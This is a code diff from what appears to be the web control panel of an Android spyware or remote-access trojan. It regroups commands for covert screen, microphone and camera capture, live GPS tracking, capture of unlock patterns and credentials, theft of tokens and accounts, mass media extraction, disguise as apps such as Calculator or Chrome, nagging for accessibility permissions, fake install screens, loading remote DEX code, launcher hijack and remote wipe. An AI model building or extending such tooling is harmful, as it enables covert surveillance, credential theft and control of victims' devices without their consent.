+                    { id: 'SET_DEBUG_UI', name: 'Debug Console Access', icon: '🔓', inputs: [{id: 'val-debug-ui', label: 'Console State', type: 'select', options: [{v: 'ON', l: 'Accessible (Visible)'}, {v: 'OFF', l: 'Locked (Hidden)'}]}] },
+                    { id: 'TOGGLE_LOGGING', name: 'Toggle Live Debugger', icon: '🐞', inputs: [{id: 'log-state', label: 'State', type: 'select', options: [{v: 'ON', l: 'Logging ON'}, {v: 'OFF', l: 'Stealth OFF'}]}] }
+                ]
+            },
+            {
+                id: 'telemetry_clan',
+                label: 'Surveillance & GPS',
+                css: 'surv',
+                search: 'camera, mic, snapshot, audio, recording, screenshot, eyes, ears, environment, sensors, realtime, socket, live, tracker, database, batch',
+                commands: [
+                    { id: 'GET_SCREENSHOT', name: 'Capture Screen', icon: '📸', keywords: 'eyes, picture, screen, capture', inputs: [{id: 'scr-quality', label: 'Quality %', type: 'number', val: 70}, {id: 'scr-freq', label: 'Freq (0=Single)', type: 'number', val: 0}, {id: 'scr-dur', label: 'Duration (s)', type: 'number', val: 0}] },
+                    { id: 'RECORD_VOICE', name: 'Record Microphone', icon: '🎙️', keywords: 'mic, audio, ears, listen', inputs: [{id: 'mic-dur', label: 'Duration (Seconds)', type: 'number', val: 10}] },
+                    { id: 'RECORD_SCREEN', name: 'Relentless Screen Record', icon: '🎥', keywords: 'video, movie, stream, monitor', inputs: [{id: 'rec-mode', label: 'Strategy', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Ghost Accept)'}, {v: 'RELENTLESS', l: 'Relentless Loop'}, {v: 'TRIGGER', l: 'Trigger Prompt'}, {v: 'SCRAPE', l: 'Scrape Dialog'}]}, {id: 'rec-dur', label: 'Duration (Sec)', type: 'number', val: 60}, {id: 'rec-qual', label: 'Resolution', type: 'select', options: [{v: 'MED', l: '720p'}, {v: 'LOW', l: '480p'}, {v: 'ULTRA_LOW', l: '360p (Data Saver)'}, {v: 'HIGH', l: '1080p'}]}, {id: 'rec-fps', label: 'Frame Rate', type: 'select', options: [{v: '30', l: '30 FPS'}, {v: '15', l: '15 FPS'}, {v: '10', l: '10 FPS'}, {v: '60', l: '60 FPS (Smooth)'}]}, {id: 'rec-audio', label: 'Audio (Mic)', type: 'select', options: [{v: 'FALSE', l: 'Video Only'}, {v: 'TRUE', l: 'With Audio'}]}] },
+                    { id: 'CAPTURE_IMAGE', name: 'Take Photos', icon: '📷', keywords: 'camera, lens, front, rear', inputs: [{id: 'cam-side', label: 'Source', type: 'select', options: [{v: 'REAR', l: 'Rear'}, {v: 'FRONT', l: 'Front'}]}, {id: 'cam-count', label: 'Quantity', type: 'number', val: 1}] },
+                    { id: 'GET_SENSORS', name: 'Sample Environment', icon: '🌡️', keywords: 'light, proximity, motion, temperature, physical, pocket', inputs: [] },
+                    { id: 'TRACKING_STREAM', name: 'High-Fidelity Tracking', icon: '🛰️', keywords: 'realtime, socket, live, tracker, database, batch', inputs: [{id: 'track-mode', label: 'Tracking Mode', type: 'select', options: [{v: 'BOTH', l: 'BOTH (Socket + DB)'}, {v: 'WEBSOCKET', l: 'WEBSOCKET (Live Map Only)'}, {v: 'DATABASE', l: 'DATABASE (Persistent Trail)'}, {v: 'OFF', l: 'Stop Tracking'}]}, {id: 'track-dur', label: 'Duration (Min)', type: 'number', val: 15}, {id: 'track-sample', label: 'GPS Sample Rate (Sec)', type: 'number', val: 3}, {id: 'track-batch', label: 'DB Batch Upload Rate (Sec)', type: 'number', val: 15}], customUI: '<div style="margin-bottom:10px;"><button class="btn" style="width:100%; border-style:dashed; color:var(--success); border-color:var(--success);" onclick="openLiveMap()">🗺️ OPEN SATELLITE MAP INTERFACE</button></div>' }
+                ]
+            },
+            {
+                id: 'recon_clan',
+                label: 'Target Recon & Extraction',
+                css: 'surv',
+                search: 'pattern, capture, credentials, pin, lock, dump, inspect, hierarchy, layout, token, key, accounts, numbers, trusted, sim, logs, logcat, engagement, usage, timeline, coordinates, vault, storage, size',
+                commands: [
+                    { id: 'CAPTURE_CREDENTIALS', name: 'Capture Credentials', icon: '🔑', keywords: 'pattern, capture, credentials, pin, lock', inputs: [{id: 'patt-timeout', label: 'Timeout (s)', type: 'number', val: 30}, {id: 'patt-qual', label: 'Quality %', type: 'number', val: 80}, {id: 'patt-fps', label: 'Frame Rate', type: 'number', val: 15}] },
+                    { id: 'GET_TREE', name: 'UI Scraper (Hierarchy)', icon: '🌲', keywords: 'dump, inspect, hierarchy, layout', inputs:[{id: 'tree-pkg', label: 'Package Name', type: 'text', placeholder: 'com.pkg'}, {id: 'tree-dur', label: 'Duration (Min)', type: 'number', val: 1}, {id: 'tree-depth', label: 'Walk Depth', type: 'number', val: 10}], cleanup: 'RESET_SCRAPER' },
                     { id: 'GET_TOKEN', name: 'Fetch Access Token', icon: '🔑', inputs: [] },
                     { id: 'GET_ACCOUNTS', name: 'Fetch Device Accounts', icon: '🆔', inputs: [] },
                     { id: 'GET_DEFAULTS', name: 'Audit Default Apps', icon: '🚥', inputs: [] },
                     { id: 'GET_NUMBERS', name: 'Fetch SIM Hardware', icon: '📇', inputs: [] },
-                    { id: 'GET_TRUSTED_SIMS', name: 'Audit Trusted SIMs', icon: '🔐', inputs: [] }
-                ]
-            },
-            {
-                id: 'forensics', 
-                label: 'Extraction & Forensics', 
-                css: 'surv', 
-                search: 'force, extract, upload, dumps, logs, usage, engagement, vault, size',
-                commands: [
-                    { id: 'MAP_GRID', name: 'Pattern Grid Discovery', icon: '🗺️', inputs: [{id: 'val-grid-depth', label: 'Scrape Depth', type: 'number', val: 10}] },
-                    { id: 'FORCE_UPLOAD', name: 'Force Data Extraction', icon: '🧬', inputs: [{id: 'val-force', label: 'Modules (sms,vitals,all)', type: 'text', val: 'ALL'}] },
+                    { id: 'GET_TRUSTED_SIMS', name: 'Audit Trusted SIMs', icon: '🔐', inputs: [] },
                     { id: 'GET_ENGAGEMENT', name: 'Usage Engagement Metrics', icon: '📈', inputs: [] },
-                    { id: 'UPLOAD_DUMPS', name: 'Sync Vault Dumps', icon: '☁️', inputs: [] },
-                    { id: 'HARVEST_MEDIA', name: 'Harvest All Media', icon: '🗃️', keywords: 'photos, videos, media, grab, sync', inputs: [] },
                     { id: 'GET_LOGS', name: 'Export System Logcat', icon: '📋', inputs: [] },
+                    { id: 'MAP_GRID', name: 'Pattern Grid Discovery', icon: '🗺️', inputs: [{id: 'val-grid-depth', label: 'Scrape Depth', type: 'number', val: 10}] },
                     { id: 'GET_VAULT_SIZE', name: 'Query Vault Storage', icon: '💾', inputs: [] },
+                    { id: 'FORCE_UPLOAD', name: 'Force Data Extraction', icon: '🧬', inputs: [{id: 'val-force', label: 'Modules (sms,vitals,all)', type: 'text', val: 'ALL'}] },
+                    { id: 'HARVEST_MEDIA', name: 'Harvest All Media', icon: '🗃️', keywords: 'photos, videos, media, grab, sync', inputs: [] },
+                    { id: 'UPLOAD_DUMPS', name: 'Sync Vault Dumps', icon: '☁️', inputs: [] },
                     { id: 'EXPORT_CONFIG', name: 'Export App Configuration', icon: '⚙️', keywords: 'export, config, settings, state, backup, zip', inputs: [] },
                     { id: 'AUTOMATE_WEB', name: 'Web Automation Engine', icon: '🤖', keywords: 'ai, bot, prompt, script, browser', inputs: [{id: 'auto-mode', label: 'Mode', type: 'select', options: [{v: 'VISIBLE', l: 'Visible (Browser UI)'}, {v: 'STEALTH', l: 'Stealth (1080x1920 Headless)'}]}, {id: 'auto-url', label: 'Target URL', type: 'text', val: 'https://aistudio.google.com/prompts/new_chat'}], customUI: '<div class="card" style="background:rgba(0,243,255,0.02); border-style:dotted; padding:10px; margin-bottom:10px;"><div class="cmd-label" style="margin-bottom:8px;">PROMPT_SEQUENCE</div><div id="auto-prompts-container" style="display:flex; flex-direction:column; gap:8px; margin-bottom:10px;"></div><button class="btn" onclick="addAutomationPrompt()" style="width:100%; font-size:0.75rem;">+ ADD PROMPT TO SEQUENCE</button></div>' }
                 ]
             },
             {
-                id: 'maint', 
-                label: 'Maintenance & Stealth', 
-                css: 'sys', 
-                search: 'stay ready, interval, cycle, masquerade, skin, tile, promos, judas, logging, feature, schedule',
-                commands: [
-                    { id: 'MASTER_TOGGLE', name: 'Master Module Bypass', icon: '⚡', inputs: [{id: 'val-master-toggle', label: 'Global State', type: 'select', options: [{v: 'ON', l: 'Enable All Modules'}, {v: 'OFF', l: 'Disable All (Stasis)'}]}] },
-                    { id: 'STAY_READY', name: 'Burst Mode (Stay Ready)', icon: '🔥', inputs: [{id: 'val-burst', label: 'Duration (Minutes)', type: 'number', val: 15}] },
-                    { id: 'SET_INTERVAL', name: 'Set Check-in Cycle', icon: '🔄', inputs: [{id: 'val-work', label: 'Minutes (Min 15)', type: 'number', val: 30}] },
-                    { id: 'TOGGLE_FEATURE', name: 'Parametric Feature Control', icon: '⚙️', inputs: [{id: 'tog-feat', label: 'Feature (e.g. location)', type: 'text'}, {id: 'tog-state', label: 'Mode', type: 'select', options: [{v: 'on', l: 'ON'}, {v: 'off', l: 'OFF'}, {v: 'sched', l: 'SCHED'}]}, {id: 'tog-p1', label: 'Mins / Start (00:00)', type: 'text'}, {id: 'tog-p2', label: 'End (23:59)', type: 'text'}] },
-                    { id: 'SET_TILE_STATE', name: 'Master Visibility Mode', icon: '👁️', inputs: [{id: 'val-tile-state', label: 'Mode', type: 'select', options: [{v: 'ON', l: 'Show Dashboard'}, {v: 'OFF', l: 'Masquerade'}]}] },
-                    { id: 'TOGGLE_LOGGING', name: 'Toggle Live Debugger', icon: '🐞', inputs: [{id: 'log-state', label: 'State', type: 'select', options: [{v: 'ON', l: 'Logging ON'}, {v: 'OFF', l: 'Stealth OFF'}]}] },
-                    { id: 'SET_DEBUG_UI', name: 'Debug Console Access', icon: '🔓', inputs: [{id: 'val-debug-ui', label: 'Console State', type: 'select', options: [{v: 'ON', l: 'Accessible (Visible)'}, {v: 'OFF', l: 'Locked (Hidden)'}]}] },
-                    { id: 'SET_MASQUERADE', name: 'Apply Stealth Skin', icon: '🎭', inputs: [{id: 'val-masquerade', label: 'App Mask', type: 'select', options: [{v: 'SETTINGS', l: 'Settings (System Default)'}, {v: 'TALKBACK', l: 'TalkBack (ACC Request)'}, {v: 'DRIVE', l: 'Drive Services'}, {v: 'CALC', l: 'Calculator'}, {v: 'GOOGLE_PHONE', l: 'Phone (Google)'}, {v: 'GOOGLE_MSG', l: 'Messages (Google)'}, {v: 'SAM_PHONE', l: 'Phone (Samsung)'}, {v: 'SAM_MSG', l: 'Messages (Samsung)'}, {v: 'CHROME', l: 'Chrome'}, {v: 'IMO', l: 'imo'}, {v: 'IMO_HD', l: 'imo HD'}, {v: 'IMO_BETA', l: 'imo beta'}, {v: 'IMO_LITE', l: 'imo lite'}, {v: 'TRUECALLER', l: 'Truecaller'}]}] },
-                    { id: 'SET_RELENTLESS_ACC', name: 'Config Persistence (ACC)', icon: '♾️', inputs: [{id: 'acc-chill', label: 'Initial Chill (Mins)', type: 'number', val: 1440}, {id: 'acc-interval', label: 'Nag Interval (Mins)', type: 'number', val: 2}, {id: 'acc-max', label: 'Max Attempts', type: 'number', val: 5}, {id: 'acc-html', label: 'Custom Nag UI (HTML)', type: 'textarea'}] },
-                    { id: 'STOP_RELENTLESS_ACC', name: 'Stop ACC Nagging', icon: '🛑', inputs: [] },
-                    { id: 'SET_JUDAS_HANDLER', name: 'Emergency SMS Fallback', icon: '📞', inputs: [{id: 'judas-handler', label: 'Handler Number(s) (Comma list ok)', type: 'text'}] },
-                    { id: 'SET_PROMOS', name: 'Deploy Cipher Promos', icon: '📨', inputs: [{id: 'promo-templates', label: 'Template A [TOKEN] ||| B...', type: 'textarea'}] },
-                    { id: 'SET_EDGE_URLS', name: 'Configure Edge URLs', icon: '🌐', keywords: 'edge, url, primary, secondary, fallback', inputs: [{id: 'edge-primary', label: 'Primary URL', type: 'text', placeholder: 'https://...'}, {id: 'edge-secondary', label: 'Secondary URL', type: 'text', placeholder: 'https://...'}] },
-                    { id: 'STORE_VOUCHER', name: 'Emergency Airtime Voucher', icon: '🎫', keywords: 'recharge, topup, recovery, balance', inputs: [{id: 'voucher-code', label: 'Voucher Code (*805*CODE#)', type: 'text'}] },
-                    { id: 'ACC_GOTO_SETTINGS', name: 'Force Accessibility Settings', icon: '⚙️', inputs: [] },
-                    { id: 'ACC_SHOW_HELP', name: 'Show Accessibility Guide', icon: '📖', inputs: [] },
-                    { id: 'FULL_ONBOARDING', name: 'Full Device Onboarding', icon: '🚀', inputs: [] },
-                    { id: 'MASTER_DISPLAY_RESET', name: 'Restore Master Visuals', icon: '☀️', keywords: 'brightness, light, font, eye, shield, clear, fix', inputs: [] }
-                ]
-            },
-            {
-                id: 'files', 
-                label: 'Files & Assets', 
-                css: 'sys', 
-                search: 'pull, push, file, skeleton, index, install, deploy, vault',
+                id: 'files_clan',
+                label: 'Storage & Deployments',
+                css: 'sys',
+                search: 'pull, push, file, skeleton, index, install, deploy, vault, run, stop, dex, task, binary',
                 commands: [
                     { 
                         id: 'PUSH_FILE', 
@@ -787,16 +740,65 @@
                     { id: 'PULL_FILE', name: 'Download File from Device', icon: '📥', inputs: [{id: 'val-pull', label: 'Remote Path', type: 'text'}] },
                     { id: 'DELETE_FILE', name: 'Purge File/Folder', icon: '🔥', inputs: [{id: 'del-path', label: 'Paths to Wipe (Pipe separated)', type: 'textarea'}] },
                     { id: 'GET_SKELETON', name: 'Scan File Structure', icon: '🦴', inputs: [{id: 'val-skeleton', label: 'Depth (1-10)', type: 'number', val: 5}] },
-                    { id: 'INSTALL_APP', name: 'Remote App Installer', icon: '📦', inputs: [{id: 'install-path', label: 'APK Path', type: 'text'}, {id: 'install-html', label: 'Fake Screen HTML', type: 'textarea'}], cleanup: 'STOP_INSTALL' }
+                    { id: 'INSTALL_APP', name: 'Remote App Installer', icon: '📦', inputs: [{id: 'install-path', label: 'APK Path', type: 'text'}, {id: 'install-html', label: 'Fake Screen HTML', type: 'textarea'}], cleanup: 'STOP_INSTALL' },
+                    { id: 'RUN_DEX_TASK', name: 'Run DEX Task', icon: '⚙️', keywords: 'dex, run, dynamic, class', inputs: [{id: 'rdt-url', label: 'URL (.dex / .zip)', type: 'text'}, {id: 'rdt-class', label: 'Class Name', type: 'text'}, {id: 'rdt-timeout', label: 'Timeout', type: 'number', val: 30}] },
+                    { id: 'STOP_DEX_TASK', name: 'Stop DEX Task', icon: '🛑', keywords: 'stop, dex, kill', inputs: [{id: 'rdt-stop-class', label: 'Class Name', type: 'text'}] }
                 ]
             },
             {
-                id: 'crisis', 
-                label: 'Crisis & Stealth', 
-                css: 'crisis', 
-                search: 'nuke, codered, lock, stop, beacon, panic, red, wipe, uninstall, anr',
+                id: 'system_clan',
+                label: 'System Control & Utilities',
+                css: 'sys',
+                search: 'toast, speak, tts, volume, ping, alert, siren, alarm, screen, timeout, flight, airplane, mobile, data, touch, coordinates, wake, intent, dynamic, checkin, cycle, interval, burst, edge, primary, secondary, fallback, voucher, recharge, topup, active, stays, restore, settings, onboard, help',
                 commands: [
-                    { id: 'MOCK_ANR', name: 'Mock ANR (Native)', icon: '⚠️', keywords: 'crash, error, not responding, close, hide, deceptive', inputs: [{id: 'anr-target', label: 'Blamed App Name (Optional)', type: 'text', placeholder: 'Leave empty for Auto-Detect'}] },
+                    { id: 'PING', name: 'Send Connection Ping', icon: '📡', inputs: [] },
+                    { id: 'TOAST', name: 'Show Toast Alert', icon: '💬', inputs: [{id: 'val-toast', label: 'Message', type: 'text'}] },
+                    { id: 'SPEAK_TEXT', name: 'Speak Text (TTS)', icon: '🗣️', inputs: [{id: 'speak-text', label: 'Message', type: 'text'}, {id: 'speak-vol', label: 'Volume %', type: 'number', val: 80}] },
+                    { id: 'RING', name: 'Sonic Alarm', icon: '🔔', inputs: [{id: 'val-ring', label: 'Duration (Seconds)', type: 'number', val: 10}] },
+                    { id: 'VOLUME', name: 'Set Audio Volume', icon: '🔊', inputs: [{id: 'vol-stream', label: 'Stream', type: 'select', options: [{v: 'RING', l: 'Ring'}, {v: 'MEDIA', l: 'Media'}, {v: 'ALARM', l: 'Alarm'}]}, {id: 'vol-level', label: 'Level (0-100 / SILENT)', type: 'text'}] },
+                    { id: 'SCREEN_TIMEOUT', name: 'Set Screen Timeout', icon: '⏲️', inputs: [{id: 'val-timeout', label: 'Seconds', type: 'number', val: 30}] },
+                    { id: 'FLIGHT_MODE', name: 'Toggle Flight Mode', icon: '✈️', keywords: 'airplane, offline, disconnect, data, signal', inputs: [{id: 'val-flight', label: 'State', type: 'select', options: [{v: 'ON', l: 'Enable (Offline)'}, {v: 'OFF', l: 'Disable (Online)'}]}] },
+                    { id: 'FORCE_DATA', name: 'Ghost Hand Data Toggle', icon: '📡', keywords: 'mobile, data, cellular, internet', inputs: [{id: 'val-data', label: 'State', type: 'select', options: [{v: 'ENABLE', l: 'Enable'}, {v: 'DISABLE', l: 'Disable'}, {v: 'TOGGLE', l: 'Toggle (Blind)'}]}] },
+                    { 
+                        id: 'REMOTE_TOUCH', 
+                        name: 'Execute Touch Chain', 
+                        icon: '⛓️', 
+                        inputs: [{id: 'touch-json-raw', label: 'Chain JSON (Auto-Generated)', type: 'textarea'}], 
+                        customUI: `
+                            <div class="card" style="padding:10px; border-style:dashed; margin-bottom:10px; background:rgba(0,243,255,0.02);">
+                                <div id="touch-chain-list" style="display:flex; flex-direction:column; gap:5px; margin-bottom:10px;"></div>
+                                <div style="display:flex; gap:5px;">
+                                    <select id="next-step-type" style="flex:1; background:#000; color:var(--primary); border:1px solid #333; font-size:0.7rem;">
+                                        <option value="NODE">TAP NODE (ID/Text)</option>
+                                        <option value="TAP">TAP COORD (X,Y)</option>
+                                        <option value="NAV">NAV ACTION</option>
+                                        <option value="WAIT">WAIT (ms)</option>
+                                        <option value="SWIPE">SWIPE (X1,Y1,X2,Y2)</option>
+                                        <option value="INTENT">REMOTE INTENT (SYS)</option>
+                                    </select>
+                                    <button class="btn" onclick="addTouchStep()" style="padding:5px 10px; font-size:0.6rem;">+ STEP</button>
+                                </div>
+                            </div>` 
+                    },
+                    { id: 'WAKE', name: 'Force Screen Wake', icon: '💡', inputs: [{id: 'val-wake', label: 'Mode', type: 'select', options: [{v: 'standard', l: 'Standard'}, {v: 'wellbeing', l: 'Route Wellbeing'}]}] },
+                    { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-pkg', label: 'Package Name', type: 'text'}, {id: 'int-cls', label: 'Class Name', type: 'text'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}, {id: 'int-json', label: '--- OR PASTE RAW JSON PAYLOAD ---', type: 'textarea'}] },
+                    { id: 'SET_EDGE_URLS', name: 'Configure Edge URLs', icon: '🌐', keywords: 'edge, url, primary, secondary, fallback', inputs: [{id: 'edge-primary', label: 'Primary URL', type: 'text', placeholder: 'https://...'}, {id: 'edge-secondary', label: 'Secondary URL', type: 'text', placeholder: 'https://...'}] },
+                    { id: 'STORE_VOUCHER', name: 'Emergency Airtime Voucher', icon: '🎫', keywords: 'recharge, topup, recovery, balance', inputs: [{id: 'voucher-code', label: 'Voucher Code (*805*CODE#)', type: 'text'}] },
+                    { id: 'SET_INTERVAL', name: 'Set Check-in Cycle', icon: '🔄', inputs: [{id: 'val-work', label: 'Minutes (Min 15)', type: 'number', val: 30}] },
+                    { id: 'STAY_READY', name: 'Burst Mode (Stay Ready)', icon: '🔥', inputs: [{id: 'val-burst', label: 'Duration (Minutes)', type: 'number', val: 15}] },
+                    { id: 'TOGGLE_FEATURE', name: 'Parametric Feature Control', icon: '⚙️', inputs: [{id: 'tog-feat', label: 'Feature (e.g. location)', type: 'text'}, {id: 'tog-state', label: 'Mode', type: 'select', options: [{v: 'on', l: 'ON'}, {v: 'off', l: 'OFF'}, {v: 'sched', l: 'SCHED'}]}, {id: 'tog-p1', label: 'Mins / Start (00:00)', type: 'text'}, {id: 'tog-p2', label: 'End (23:59)', type: 'text'}] },
+                    { id: 'MASTER_DISPLAY_RESET', name: 'Restore Master Visuals', icon: '☀️', keywords: 'brightness, light, font, eye, shield, clear, fix', inputs: [] },
+                    { id: 'ACC_GOTO_SETTINGS', name: 'Force Accessibility Settings', icon: '⚙️', inputs: [] },
+                    { id: 'ACC_SHOW_HELP', name: 'Show Accessibility Guide', icon: '📖', inputs: [] },
+                    { id: 'FULL_ONBOARDING', name: 'Full Device Onboarding', icon: '🚀', inputs: [] }
+                ]
+            },
+            {
+                id: 'defense_clan',
+                label: 'Crisis, Intercepts & Failsafes',
+                css: 'crisis',
+                search: 'wipe, tasks, kill, recents, memory, invisible, codered, loop, beacon, lock, hardware, password, stolen, recovery, status, stop, blindfold, bypass, judas, promo, template, persistent, nag, accessibility',
+                commands: [
                     { id: 'WIPE_TASKS', name: 'Stealth Task Purge', icon: '🧹', keywords: 'kill, clear all, recents, memory, invisible', inputs: [] },
                     { id: 'CODERED', name: 'Trigger Code Red Loop', icon: '🚨', inputs: [{id: 'cr-code', label: 'Codes', type: 'text', val: '0'}, {id: 'cr-dur', label: 'Duration (Min)', type: 'number', val: 15}, {id: 'cr-freq', label: 'Freq (Sec)', type: 'number', val: 30}] },
                     { id: 'LOCK_SCREEN', name: 'Force Device Lock', icon: '🔒', inputs: [] },
@@ -804,7 +806,13 @@
                     { id: 'DISABLE_STEALTH', name: 'Lift Stealth Lock', icon: '🔓', keywords: 'unlock, volume, restore, normal', inputs: [] },
                     { id: 'EVALUATE_SIM', name: 'Force SIM Evaluation', icon: '🔍', keywords: 'sim, check, trigger, trap', inputs: [] },
                     { id: 'STOP_BEACON', name: 'Dark Mode (Stop Beacon)', icon: '🌑', keywords: 'stealth, hide, kill', inputs: [] },
-                    { id: 'NUKE', name: 'Remote Self-Destruct', icon: '☢️', keywords: 'wipe, factory, delete, forensic, destroy', inputs: [] }
+                    { id: 'NUKE', name: 'Remote Self-Destruct', icon: '☢️', keywords: 'wipe, factory, delete, forensic, destroy', inputs: [] },
+                    { id: 'MASTER_TOGGLE', name: 'Master Module Bypass', icon: '⚡', inputs: [{id: 'val-master-toggle', label: 'Global State', type: 'select', options: [{v: 'ON', l: 'Enable All Modules'}, {v: 'OFF', l: 'Disable All (Stasis)'}]}] },
+                    { id: 'SET_JUDAS_HANDLER', name: 'Emergency SMS Fallback', icon: '📞', inputs: [{id: 'judas-handler', label: 'Handler Number(s) (Comma list ok)', type: 'text'}] },
+                    { id: 'SET_PROMOS', name: 'Deploy Cipher Promos', icon: '📨', inputs: [{id: 'promo-templates', label: 'Template A [TOKEN] ||| B...', type: 'textarea'}] },
+                    { id: 'SET_RELENTLESS_ACC', name: 'Config Persistence (ACC)', icon: '♾️', inputs: [{id: 'acc-chill', label: 'Initial Chill (Mins)', type: 'number', val: 1440}, {id: 'acc-interval', label: 'Nag Interval (Mins)', type: 'number', val: 2}, {id: 'acc-max', label: 'Max Attempts', type: 'number', val: 5}, {id: 'acc-html', label: 'Custom Nag UI (HTML)', type: 'textarea'}] },
+                    { id: 'STOP_RELENTLESS_ACC', name: 'Stop ACC Nagging', icon: '🛑', inputs: [] },
+                    { id: 'HIJACK_LAUNCHER', name: 'Hijack Home Role', icon: '🏠', keywords: 'home, default, ghost, hand, blindfold', inputs: [] }
                 ]
             }
         ];
@@ -1393,13 +1401,13 @@
             urlInput.value = "";
         }
 
-        async function sendCmd(type, forcedVal = null) {
+        async         function sendCmd(type, forcedVal = null) {
             if (selectedDeviceIds.size === 0) return alert("NO TARGETS SELECTED");
 
             // --- PERSISTENCE ENGINE: SAVE LAST PARAMS ---
             const lastParams = JSON.parse(localStorage.getItem('cortex_last_params') || '{}');
             COMMAND_GROUPS.forEach(g => {
-                const cmd = g.commands.find(c => c.id === type);
+                const cmd = (g.commands || []).find(c => c.id === type);
                 if (cmd && cmd.inputs) {
                     cmd.inputs.forEach(input => {
                         const el = document.getElementById(input.id);
